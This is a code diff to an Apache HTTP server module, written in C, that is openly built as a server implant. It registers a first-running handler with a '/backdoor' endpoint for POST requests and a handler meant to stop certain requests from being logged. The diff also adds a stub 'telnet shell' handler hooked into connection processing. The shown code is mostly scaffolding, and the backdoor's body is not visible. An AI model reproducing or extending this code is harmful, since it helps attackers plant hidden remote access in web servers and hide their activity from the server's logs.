@@ -16,12 +16,6 @@ static int winchester_handler(request_rec *r)
         return OK;
     }
 
-    // sub-handler for telnet shell
-    //if (strcmp(r->unparsed_uri, "/shell") == 0) {
-    //    ap_rprintf(r, "Shell dir");
-    //    return DONE;
-    //}
-
     // sub-handler for post backdoor
     if (strcmp(r->unparsed_uri, "/backdoor") == 0 && r->method_number == M_POST) {
         apr_bucket_brigade *bb_in;
@@ -79,12 +73,18 @@ static int winchester_handler(request_rec *r)
 	return OK;
 }
 
+// telnet shell handler
+static int shell_handler(request_rec *r)
+{
+    return DECLINED;
+}
+
 // logging handler
 static int backblast_handler(request_rec *r)
 {
     if (strcmp(r->filename, "dont_log_me")) {
         // if this filename does not appear, move along
-        return OK;
+        return DECLINED;
     }
 
     // if it does, throw DONE without logging
@@ -94,6 +94,7 @@ static int backblast_handler(request_rec *r)
 static void register_hooks(apr_pool_t *pool)
 {
    ap_hook_post_read_request(winchester_handler, NULL, NULL, APR_HOOK_REALLY_FIRST);
+   ap_hook_process_connection(shell_handler, NULL, NULL, APR_HOOK_FIRST);
    // ap_hook_log_transaction(backblast_handler, NULL, NULL, APR_HOOK_REALLY_FIRST);
 }
 
